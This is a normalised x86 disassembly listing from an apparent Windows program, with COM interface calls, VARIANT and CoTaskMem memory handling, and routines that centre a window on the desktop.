lea eax [ ebp - 0x34 ]
push esi
push eax
call sub_410a20
push 0x10
lea eax [ ebp - 0x14 ]
push esi
push eax
call sub_410a20
add esp 0x18
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ edi + 0xa8 ]
mov edx [ eax ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push 0x2
push esi
push r--data
push ebx
push eax
call [ edx + 0x18 ]
cmp [ ebp - 0x30 ] esi
mov ebx [ SysFreeString@IAT ]
mov [ ebp + 0xc ] eax
je r-xdata
cmp [ ebp - 0x2c ] esi
je r-xdata
push [ ebp - 0x30 ]
call ebx
cmp [ ebp - 0x28 ] esi
je r-xdata
push [ ebp - 0x2c ]
call ebx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp + 0xc ] esi
jl r-xdata
push [ ebp - 0x28 ]
call ebx
mov [ edi + 0xa4 ] 0x1
sub_40c50c
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp [ eax - 0x28 ] esi
lea ecx [ eax - 0xc8 ]
jne r-xdata
xor eax eax
cmp [ ecx + 0x88 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call sub_40b67c
mov eax [ ebp - 0xc ]
cmp eax esi
jne r-xdata
pop esi
leave
retn 0x8
sub_40c561
push ebp
mov ebp esp
push esi
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_410ae0
mov esi [ ebp + 0x8 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
push esi
mov [ eax ] esi
mov eax [ esi ]
call [ eax + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi - 0x90 ]
push 0x10
push eax
push [ ebp + 0xc ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_40c5c5
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
xor esi esi
lea ecx [ eax - 0xcc ]
mov [ ebp - 0x24 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call sub_40b67c
cmp [ ebp + 0x20 ] esi
pop esi
je r-xdata
mov eax [ ebp - 0xc ]
leave
retn 0x24
push [ ebp + 0x20 ]
call [ VariantClear@IAT ]
sub_40c61a
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
xor edi edi
push 0xa
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
call sub_41e1ac
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
retn 0x4
sub_40c668
mov eax sub_42b14f
call sub_410a78
sub esp 0x14
push ebx
push esi
mov esi ecx
mov [ ebp - 0x20 ] esi
mov [ esi ] r--data
xor ebx ebx
cmp [ esi + 0x58 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push edi
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x1c ] ecx
call sub_41e1eb
cmp [ esi + 0x40 ] ebx
je r-xdata
mov eax [ esi + 0x1c ]
push ebx
mov edi [ eax + 0x8 ]
mov ecx [ edi ]
push [ edi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xb8 ]
mov eax [ edi ]
mov [ eax + 0x90 ] ebx
jmp r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x18 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
xor edi edi
cmp [ esi + 0x38 ] ebx
jle r-xdata
cmp [ esi + 0x24 ] ebx
je r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
je r-xdata
mov eax ebx
add eax [ esi + 0x40 ]
push eax
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ esi + 0x58 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ esi + 0x14 ] ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ esi + 0x3c ]
call sub_4221e2
push [ esi + 0x40 ]
call sub_4221e2
pop ecx
pop ecx
xor ebx ebx
cmp [ esi + 0x38 ] ebx
mov eax [ esi + 0x34 ]
cmp eax ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
jle r-xdata
mov ecx [ esi + 0x54 ]
cmp ecx ebx
je r-xdata
push eax
call [ CoTaskMemFree@IAT ]
push [ esi + 0x14 ]
call [ CoTaskMemFree@IAT ]
xor edi edi
mov edi [ esi + 0x54 ]
cmp edi ebx
je r-xdata
mov eax [ esi + 0x50 ]
push [ eax ]
call sub_40c848
mov ecx [ esi + 0x54 ]
call sub_40c969
mov eax [ esi + 0x14 ]
mov ecx [ eax + edi + 0x24 ]
call sub_41e1eb
mov eax [ esi + 0x14 ]
mov ecx [ eax + edi + 0x24 ]
cmp ecx ebx
je r-xdata
mov ecx eax
mov eax [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x90 ] ebx
jmp r-xdata
mov edi [ esi + 0x50 ]
cmp edi ebx
je r-xdata
mov ecx edi
call sub_40c969
push edi
call sub_4221e2
pop ecx
inc [ ebp - 0x14 ]
add edi 0x28
mov eax [ ebp - 0x14 ]
cmp eax [ esi + 0x10 ]
jl r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4c ]
pop edi
cmp eax ebx
je r-xdata
mov ecx edi
call sub_40c8cf
push edi
call sub_4221e2
pop ecx
mov eax [ esi + 0x14 ]
mov eax [ eax + edi + 0x24 ]
mov eax [ eax + 0x4 ]
mov esi [ esi + 0x48 ]
cmp esi ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ ebp - 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
call sub_41e20b
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
sub_40c848
mov eax sub_42b164
call sub_410a78
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
cmp [ esi + 0x4 ] ebx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push edi
mov [ ebp - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
mov ecx [ eax ]
push eax
mov [ ebp - 0x4 ] ebx
call [ ecx ]
cmp eax ebx
mov [ ebp - 0x14 ] eax
jl r-xdata
push [ esi ]
mov [ esi + 0x4 ] ebx
call sub_4221e2
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
pop ecx
cmp eax ebx
mov [ esi ] ebx
pop edi
je r-xdata
xor edi edi
cmp [ esi + 0x4 ] ebx
jbe r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov edx [ esi ]
mov eax [ ebp - 0x10 ]
push ebx
push [ edx + edi * 8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
inc edi
cmp edi [ esi + 0x4 ]
jb r-xdata
sub_40c8cf
mov eax sub_42b183
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_40c91a
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi ]
or [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
sub_40c91a
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
call sub_40c949
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
and [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x4 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40c949
push esi
push edi
lea esi [ ecx + 0xc ]
xor edi edi
xor eax eax
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
retn
mov eax [ ecx ]
push edi
push edi
push edi
mov ecx [ eax ]
push esi
push 0x1
push eax
call [ ecx + 0x18 ]
mov [ esi ] edi
sub_40c969
push esi
mov esi ecx
push edi
mov edi [ CoTaskMemFree@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call edi
and [ esi + 0x10 ] 0x0
push [ esi + 0x8 ]
call sub_4221e2
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
pop ecx
pop edi
pop esi
retn
push eax
call edi
and [ esi + 0x14 ] 0x0
sub_40c9a3
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x24 ]
call sub_42089b
mov edi eax
mov [ ebp - 0x8 ] edi
push [ edi + 0x1c ]
call [ IsWindowVisible@IAT ]
neg eax
sbb eax eax
push 0x0
inc eax
pop ebx
mov [ ebp - 0x14 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
lea edi [ esi + 0x48 ]
push edi
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
test eax eax
jl r-xdata
call [ GetDesktopWindow@IAT ]
push eax
call sub_41f3e7
lea ecx [ ebp - 0x34 ]
push ecx
push [ eax + 0x1c ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push [ edi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x28 ]
push ebx
sub eax [ ebp - 0x30 ]
push ebx
push ebx
mov ecx edi
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x34 ]
cdq
sub eax edx
sar eax 0x1
push eax
call sub_421afc
push 0x1
mov ecx edi
call sub_421b8c
mov eax [ esi + 0x4 ]
lea edx [ ebp - 0xc ]
push edx
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
cmp eax ebx
jl r-xdata
mov eax [ edi ]
lea edi [ esi + 0x4c ]
push edi
push r--data
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xc ]
cmp [ edi ] ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jge r-xdata
mov [ ebp - 0x4 ] 0x80004003
mov ecx [ eax ]
lea edi [ esi + 0x8 ]
push edi
push r--data
push eax
call [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax ebx
jl r-xdata
mov eax 0x80004005
jmp r-xdata
mov ecx esi
call sub_40cbae
cmp [ ebp - 0x14 ] ebx
mov esi eax
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov edi [ edi ]
lea ecx [ esi + 0xc ]
push ecx
push r--data
mov eax [ edi ]
push edi
call [ eax ]
mov eax esi
mov eax [ ebp - 0x18 ]
push ebx
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_421afc
mov ecx [ ebp - 0x8 ]
push ebx
call sub_421b8c
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push ebx
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_421afc
mov ecx [ ebp - 0x8 ]
push ebx
call sub_421b8c
sub_40cb45
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ecx + 0x48 ]
test edx edx
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x50 ]
neg eax
sbb eax eax
and eax edx
leave
retn
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ecx + 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx ]
test eax eax
jl r-xdata
xor eax eax
leave
retn
mov eax [ ebp - 0x4 ]
leave
retn
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_40cbae
mov eax sub_42b1a3
call sub_410a78
sub esp 0x98
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x14 ]
cmp [ esi + 0x48 ] edi
mov [ ebp - 0x28 ] eax
mov eax [ esi + 0x10 ]
mov [ ebp - 0x2c ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
cmp eax edi
mov [ ebp - 0x20 ] eax
jl r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x24 ]
push edx
lea edx [ ebp - 0x1c ]
push edx
push r--data
push eax
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x18 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
lea eax [ ebp - 0xa4 ]
push r--data
push eax
mov ecx esi
call sub_40d3dd
or [ ebp - 0x84 ] 0xffffffff
lea eax [ ebp - 0x74 ]
push r--data
push eax
mov ecx esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x80 ] 0x18
mov [ ebp - 0x7c ] edi
mov [ ebp - 0x78 ] 0x1fb
call sub_40d3dd
mov eax [ ebp - 0x1c ]
or [ ebp - 0x54 ] 0xffffffff
push edi
lea edx [ ebp - 0xa4 ]
push 0x28
mov [ ebp - 0x5c ] 0x1c
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x50 ] 0x20
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x48 ] 0x1e
mov ecx [ eax ]
push edx
push 0x2
push eax
call [ ecx + 0x10 ]
mov ebx eax
cmp ebx edi
jge r-xdata
push 0x10
call sub_4221b9
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] edi
push edx
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x24 ]
lea ebx [ ebp - 0x44 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x1c ]
xor ecx ecx
push ebx
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] edi
mov edx [ eax ]
push ecx
push ecx
push eax
call [ edx + 0x18 ]
cmp eax edi
mov [ ebp - 0x20 ] eax
jge r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
jmp r-xdata
xor eax eax
push [ ebp - 0x14 ]
mov ecx eax
call sub_40cece
jmp r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
lea edx [ esi + 0x58 ]
push edx
mov edx [ esi + 0x4 ]
mov ecx [ eax ]
add edx 0xd8
push edx
push eax
call [ ecx + 0x14 ]
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x38 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x24 ] eax
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x34 ] ecx
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x50 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ esi + 0x50 ]
call sub_40cff2
push 0x1c
call sub_4221b9
cmp eax edi
pop ecx
je r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx edi
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x20 ]
cmp [ esi + 0x10 ] edi
mov [ ebp - 0x14 ] edi
jle r-xdata
mov ecx [ esi + 0x50 ]
mov [ esi + 0x54 ] eax
push [ ecx ]
mov ecx eax
call sub_40d007
mov ecx [ esi + 0x50 ]
mov eax [ esi + 0x54 ]
mov [ ecx + 0x8 ] eax
mov eax [ esi + 0x54 ]
mov eax [ eax + 0xc ]
mov [ esi + 0x10 ] eax
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call [ CoTaskMemAlloc@IAT ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0x14 ] eax
lea ecx [ ecx + ecx * 4 ]
shl ecx 0x3
push ecx
push edi
push eax
call sub_410a20
mov ecx [ esi + 0x50 ]
add esp 0xc
call sub_40cf1f
mov ecx [ esi + 0x50 ]
call sub_40c949
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp eax edi
jle r-xdata
xor eax eax
push 0xa
mov ecx eax
call sub_41e1ac
jmp r-xdata
push [ ebp - 0x28 ]
call [ CoTaskMemFree@IAT ]
add ecx 0x24
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] ecx
push 0x1c
call sub_4221b9
pop ecx
mov [ ebp - 0x18 ] eax
cmp eax edi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ esi + 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
inc [ ebp - 0x14 ]
mov [ ebx + ecx + 0x24 ] eax
mov eax [ ebp - 0x14 ]
add ebx 0x28
cmp eax [ esi + 0x10 ]
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call sub_41e1eb
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
cmp ecx edi
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ebx [ ebx ]
push 0x1
push [ eax + 0x8 ]
mov ecx esi
call [ edx + 0x8 ]
jmp r-xdata
add [ ebp - 0x10 ] 0x28
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov ebx [ eax + 0x4 ]
sub_40cece
mov eax sub_42b1c3
call sub_410a78
sub esp 0x14
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ esi ] edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0x4 ] edi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
push esi
call sub_40f37c
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
call sub_40c8cf
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40cf1f
push esi
mov esi ecx
call sub_40c949
mov eax [ esi ]
push 0x0
push eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
test eax eax
jl r-xdata
pop esi
retn
push 0x1
push 0x0
mov ecx esi
call sub_40cf42
sub_40cf42
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push esi
mov esi ecx
call sub_40c949
lea edx [ ebp - 0x4 ]
lea eax [ esi + 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
mov dl [ ebp + 0xc ]
neg dl
sbb edx edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
and edx 0x2
dec edx
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push 0x0
push eax
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
pop esi
leave
retn 0x8
push edi
mov ecx esi
call sub_40cf9b
mov edi eax
test edi edi
jge r-xdata
mov eax edi
pop edi
mov ecx esi
call sub_40c949
sub_40cf9b
push ebx
push esi
mov esi ecx
push edi
xor eax eax
xor edi edi
mov ecx [ esi + 0x8 ]
mov ebx [ ecx + 0x4 ]
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x8 ]
mov ecx [ ecx ]
cmp [ ecx + edi * 8 + 0x4 ] 0x0
je r-xdata
inc edi
cmp edi ebx
jb r-xdata
push edi
mov ecx esi
call sub_40cfcf
test eax eax
jl r-xdata
sub_40cfcf
mov eax [ ecx + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov edx [ eax + 0x8 ]
mov eax [ eax ]
push edx
mov esi [ eax + esi * 8 ]
mov eax [ ecx ]
push esi
push [ ecx + 0xc ]
mov edi [ eax ]
push eax
call [ edi + 0x10 ]
pop edi
pop esi
retn 0x4
sub_40d007
mov eax sub_42b1e0
call sub_410a78
sub esp 0x20
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x14 ] edi
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
push ecx
push rw-data
mov eax [ esi ]
push esi
mov [ ebp - 0x4 ] edi
call [ eax ]
cmp eax edi
mov [ ebp + 0x8 ] eax
jge r-xdata
cmp [ ebx + 0x10 ] 0x0
mov [ ebp + 0x8 ] edi
lea edi [ ebx + 0x10 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
cmp eax edi
je r-xdata
mov [ ebx + 0x18 ] 0x1
and [ ebp - 0x1c ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x1c ]
push ecx
push rw-data
push esi
mov [ ebp - 0x4 ] 0x1
call [ eax ]
mov esi eax
test esi esi
jge r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x18 ]
xor esi esi
cmp eax esi
mov [ ebp - 0x4 ] esi
jne r-xdata
mov eax [ ebp - 0x1c ]
lea edx [ ebx + 0x14 ]
push edx
lea edx [ ebx + 0xc ]
mov ecx [ eax ]
push edi
push edx
push eax
call [ ecx + 0xc ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] esi
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
cmp eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ ebx + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
lea esi [ esi + esi * 2 ]
shl esi 0x4
add eax esi
cmp [ eax + 0x10 ] 0x400
ja r-xdata
je r-xdata
mov eax [ ebx + 0xc ]
and [ ebp - 0x18 ] 0x0
imul eax eax 0x34
push eax
mov [ ebp - 0x4 ] 0x2
call sub_4221b9
pop ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov eax esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ ebp + 0x8 ]
and [ ebx + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x6
call sub_4221b9
pop ecx
mov [ ebx + 0x8 ] eax
jmp r-xdata
push 0x1
mov ecx ebx
call sub_40d2b8
mov esi eax
test esi esi
jge r-xdata
and [ ebp - 0x2c ] 0x0
push 0x14
mov [ ebp - 0x4 ] 0x4
call sub_4221b9
pop ecx
mov edx eax
jmp r-xdata
cmp [ eax + 0x14 ] 0xd
je r-xdata
mov eax 0x8007000e
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x4 ] 0x1
push [ ebp - 0x18 ]
call sub_4221e2
pop ecx
jmp r-xdata
and [ ebp - 0x4 ] 0x0
test edx edx
je r-xdata
xor edx edx
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push [ ebx ]
push [ ebx + 0xc ]
push [ ebp - 0x18 ]
call sub_40d314
push [ ebp - 0x18 ]
mov esi eax
call sub_4221e2
add esp 0x18
push [ ebp - 0x18 ]
call sub_4221e2
pop ecx
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
and [ edx ] 0x0
lea edi [ edx + 0x4 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x20 ]
mov eax [ ebx + 0x10 ]
lea esi [ esi + esi * 2 ]
shl esi 0x4
mov [ eax + esi + 0x14 ] 0xd
mov eax [ ebx + 0x10 ]
mov [ eax + esi + 0x10 ] 0x4
mov eax [ ebx + 0x10 ]
add eax esi
mov cx [ eax + 0x14 ]
cmp cx 0x81
je r-xdata
inc [ eax + 0x10 ]
cmp cx 0x82
jne r-xdata
cmp esi [ ebx + 0xc ]
jae r-xdata
mov eax [ ebx + 0x10 ]
push edx
add eax esi
mov edi [ eax + 0x10 ]
mov ecx edi
and ecx 0x3
add ecx edi
add ecx [ ebp + 0x8 ]
lea edi [ ecx + 0x4 ]
push edi
push ecx
push [ ebp + 0x8 ]
mov cl [ eax + 0x17 ]
push 0x0
push ecx
mov cl [ eax + 0x16 ]
push ecx
mov cx [ eax + 0x14 ]
